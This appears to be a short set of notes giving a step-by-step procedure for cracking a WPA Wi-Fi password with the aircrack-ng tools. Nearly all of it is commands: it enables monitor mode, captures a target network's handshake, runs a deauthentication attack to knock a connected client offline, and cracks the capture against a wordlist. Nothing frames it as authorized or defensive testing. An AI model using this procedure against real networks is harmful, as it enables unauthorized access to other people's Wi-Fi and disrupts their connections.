- Only packets that can aid with the cracking process are the handshake packets.
  -- These are 4 packets sent when a client connects to the network.


STEP 1: Capture the handshake packets

--> TERM1 # airmon-ng start wlan0
--> TERM1 # airodump-ng [MonitorModeInterface]
--> TERM1 # Ctl+c
--> TERM1 # airodump-ng --bssid <BSSID> --channel <CHANNEL> --write <fileName_wpa_handshake> [MonitorModeInterface]
--> TERM2 #  #aireplay-ng --deauth 4 -a <AP_MAC_address> -c <connected_Client_STATION_mac> [MonitorModeInterface] //perform a de-authentication attack to disconnect the client so that a handshake can be captured when client automatically attempt to connect to the network.
Once we have the handshake "WPA handshake : xxxxxxxxx" mesage in TERM1, stop the capture.
--> TERM1 # CTL+c
--> TERM1 # aircrack-ng  <fileName_wpa_handshake.cap> -w <wordList>
